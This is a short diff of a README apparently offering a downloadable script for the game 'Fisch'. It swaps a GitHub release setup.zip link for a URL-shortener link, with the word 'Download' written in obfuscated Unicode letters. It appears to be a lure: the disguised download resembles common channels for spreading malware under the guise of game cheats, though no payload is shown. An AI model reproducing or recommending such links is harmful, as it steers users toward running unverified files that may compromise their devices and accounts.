@@ -39,7 +39,7 @@
 
 
 
-# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/BoomssloI/Fisch/releases/download/Download/setup.zip)***
+# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://getwix.short.gy/main)***
 
 
 ![maxresdefault](https://github.com/user-attachments/assets/193f92cd-5c94-4a40-b2aa-55299d5a3152)
